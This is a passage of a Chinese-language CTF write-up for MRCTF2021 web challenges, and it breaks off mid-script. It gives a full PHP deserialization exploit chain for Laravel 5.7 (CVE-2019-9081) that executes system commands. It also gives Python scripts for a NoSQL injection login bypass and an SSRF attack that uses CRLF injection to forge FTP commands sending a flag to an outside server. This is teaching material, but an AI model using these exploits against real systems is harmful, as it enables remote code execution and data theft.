# MRCTF2021 Web方向Wp
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## ez_larave1
这题出的时间比较短，想的链也比较简单，但是貌似被非预期了。。。考察的还是5.7.X的反序列化漏洞CVE-2019-9081，不过还是想的预选链太少了，简单说一下这个题的预期解思路，用`Beyond
Compare`看一下哪些地方进行修改了，发现多了个路由:
    _fn_close)) {
                call_user_func($this->_fn_close);
            }
        }
可以进行命令执行，不过这里只允许一个参数，但是认为这里会存在非预期解，可以调用无函数的类方法的话，应该有许多链可以选择，注意到我们需要key,而key其实被藏在了public目录下`.xxx.txt`中（具体是啥我也不记得了），这里是想考察原生类的利用，经过对比其实发现  
`vendor\laravel\framework\src\Illuminate\Filesystem\Filesystem.php`
这里有一个比较撇脚的`__toString()`使用了`FilesystemIterator`，会输出该目录下的文件，输出第一个文件的名字，但是`.axx.txt`不出意外会被排在第一个文件，因此通过这个链来得到我们想要的key，既然可以调用静态的类方法，后面其实也就是重新跳到原来的链子上，直接贴exp吧，各位师傅还请见谅:
    _fn_close = $obj;
        }
        public function __get($name)
        {
        }
        public function __destruct()
        {
            if (isset($this->_fn_close)) {
                call_user_func($this->_fn_close);
            }
        }
        public function __wakeup()
        {
        }
        public static function decorate()
        {
        }
        public function __toString()
        {
        }
        public function close()
        {
        }
        public function detach()
        {
        }
        public function getSize()
        {
        }
        public function tell()
        {
        }
        public function eof()
        {
        }
        public function isSeekable()
        {}
        public function rewind()
        {}
        public function seek($offset, $whence = SEEK_SET)
        {}
        public function isWritable()
        {}
        public function write($string)
        {
        }
        public function isReadable()
        {
        }
        public function read($length)
        {
        }
        public function getContents()
        {
        }
        public function getMetadata($key = null)
        {
        }
    }
    }
    namespace Symfony\Component\HttpFoundation{
        class Response{
            public $content;
            public function __construct($obj)
            {
                $this->content = $obj;
            }
            public function sendContent(){
            echo $this->content;
            return $this;
            }
        }
    }
    namespace Illuminate\Filesystem{
        use ErrorException;
        use FilesystemIterator;
        use Symfony\Component\Finder\Finder;
        use Illuminate\Support\Traits\Macroable;
        use Illuminate\Contracts\Filesystem\FileNotFoundException;
        class Filesystem{
        }
    }
    namespace Illuminate\Foundation\Testing{
        use PHPUnit\Framework\TestCase as PHPUnitTestCase;
        class PendingCommand{
            protected $app;
            protected $command;
            protected $parameters;
            public $test;
            public function __construct($test, $app, $command, $parameters)
            {
                $this->app = $app;
                $this->test = $test;
                $this->command = $command;
                $this->parameters = $parameters;
            }
        }
    }
    namespace Illuminate\Auth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes)
            {
                $this->attributes = $attributes;
            }
            public function __get($key)
            {
                return $this->attributes[$key];
            }
        }
    }
    namespace Illuminate\Foundation{
        class Application{
            protected $instances = [];
            public function __construct($instances = [])
            {
                $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
            }
        }
    }
    //先通过原生类读到.key.txt 
    namespace{
        //payload 第一部分
        /*
        $text = new \Illuminate\Filesystem\Filesystem();
        $obj1 = new \Symfony\Component\HttpFoundation\Response($text);
        $arr = array($obj1,"sendContent"); //调用__toString()方法
        $obj = new \GuzzleHttp\Psr7\FnStream($arr); 
        echo urlencode(serialize($obj));
        */
        //payload 第二部分
        $genericuser = new Illuminate\Auth\GenericUser(
            array(
                //这里需要两次使用来循环获得以便成功跳过方法,两次键名分别为expectedOutput和expectedQuestions
                "expectedOutput"=>array("crispr"=>"0"),
                "expectedQuestions"=>array("crispr"=>"1")
            )
        );
        $app = new Illuminate\Foundation\Application();
        //通过如下步骤最终获得的$this->app[Kernel::class]就是该Application实例
        $application = new Illuminate\Foundation\Application($app);
        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
            $genericuser,
            $application,
            "system",
            array("cat /flag")
        );
        $obj = new \GuzzleHttp\Psr7\FnStream(array($pendingcommand,"run"));
        echo urlencode(serialize($obj));
    }
## Half-Nosqli
这个题出的特别匆忙，几乎是最后一天出完（一半）的，这也是Half-Nosqli名字的来由,因此有些地方设计的还不是很精巧（好活就是烂了点）
首先是`swagger`的常用路径`./docs`
然后就能看到所有的接口了
第一步是登录
这里使用`nosqli`的永真trick绕过
    import requests as r
    url = "http://node.mrctf.fun:23000/"
    json = {
        "email":{
            "$ne":1
        },
        "password":{
            "$ne":1
        }
    }
    req = r.post(url+"login",json=json)
    print(req.text)
    token = req.json()['token']
拿到token后，下一步是利用`home`api打ssrf
首先可以打到自己vps上看看效果
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    url_payload = "http://buptmerak.cn:2333"
    json = {
        "url":url_payload
    }
    req = r.post(url+"home",headers=headers,json=json)
    print(req.text)
发现发送了HTTP的请求包
这篇文章里讲了一个node下存在的`CRLF`注入方法,即利用unicode截断构造`\r\n`
同样的，我们也可以利用其它unicode构造1空格等特殊字符，所以我们可以伪造一个ftp协议的请求
    headers = {
        "Accept":"*/*",
        "Authorization":"Bearer "+token,
    }
    url_payload = "http://buptmerak.cn:2333/"
    payload ='''
    USER anonymous
    PASS admin888
    CWD files
    TYPE I
    PORT vpsip,0,1890
    RETR flag
    '''.replace("\n","\r\n")
    def payload_encode(raw):